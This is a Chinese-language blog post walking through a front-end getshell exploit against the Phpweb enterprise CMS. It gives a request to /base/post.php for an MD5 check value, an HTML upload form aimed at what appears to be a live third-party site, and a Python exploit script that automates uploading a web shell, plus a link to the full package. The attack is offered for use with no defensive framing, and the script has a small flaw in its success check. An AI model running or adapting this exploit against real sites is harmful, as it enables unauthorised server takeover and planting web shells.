---
title: Phpweb Reception Getshell
published: true
---
Phpweb 是一款企业cms，并不开源，但这并不妨碍Hacker们查找漏洞!

# [](#header-1)前言

这篇文章是复现Phpweb前台getshell漏洞,漏洞详细我不讲了,请自行到90SEC(forum.90sec.com)上查看!

本篇文章还会涉及工具的编写(Python)!

漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php /base/appborder.php

# [](#header-2)复现

1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取!
```php
curl "http://website/base/post.php" -H "act=appcode"
```
![](https://m4tir.github.io/assets/1.png)
```php
ac34c64cdb405eff881efc5476a64761 ##这个就是初始值
```
2.获取加密后得md5值

然后将初始值md5加密(ac34c64cdb405eff881efc5476a64761 + "a")

得到加密后的MD5值!
```php
e10adc3949ba59abbe56e057f20f883e ##这个就是加密后的md5值(终值)!
```
3.Getsehll
exp:
```php
<html>
<body>
<form action="http://wxzljz.com/base/appfile.php" method="post" enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="file" id="file" />
<input type="text" name="t" value="a" />
<input type="text" name="m" value="25a824696cb75a44aabd05a08070789f" />
<input type="text" name="act" value="upload" />
<input type="text" name="r_size" value="14" />
<br />
<input type="submit" name="submit" value="getshell" />
</form>
</body>
</html>
```
![](https://m4tir.github.io/assets/2.png)

然后...Getshell!

![](https://m4tir.github.io/assets/3.png)

当出现OK两个大字时,说明你成功了!!!

上传的shell路径是/effect/source/bg/shell名称.php

![](https://m4tir.github.io/assets/4.png)

# [](#header-3)工具编写
Python exp[Python3]:
```python
# -*- coding: UTF-8 -*- #
import os
import requests
import hashlib

bdlj = os.getcwd()
headers = open(bdlj+"\headers.txt",'r')
headerss = headers.read()
print('\b')

ur = input("请输入目标网址:")
requrl =  ur + '/base/post.php'
reqdata = {"act":"appcode"}
r = requests.post(requrl,data=reqdata)
cz=r.text[2:34]
print ('初值:' + cz)

cz=r.text[2:34]+"a"
m = hashlib.md5()
b = cz.encode(encoding='utf-8')
m.update(b)
zz = m.hexdigest()
print ('终值:' + zz)

infile = open(bdlj + "\datas.txt", "r",encoding='utf-8')
outfile = open(bdlj + "\datah.txt", "w",encoding='utf-8')
for line in infile:
      outfile.write(line.replace('156as1f56safasfasfa', zz))
infile.close()
outfile.close()
datas = open(bdlj+"\datah.txt",'r')
datass = datas.read()

gs = requests.post(ur + '/base/appfile.php',data=datass,headers={'Content-Type':headerss})
gs.encoding = 'utf-8'
print (gs.text)

if {gs.text == "OK"}:
	print ("Getshell成功! Shell:" + ur + "/effect/source/bg/mstir.php")
else:
	print ("Getsehll失败!")
```

整包下载地址:https://m4tir.github.io/assets/Phpweb-Getshell-py.rar

使用请下载整包,否则会缺少协议头和data数据!

END!
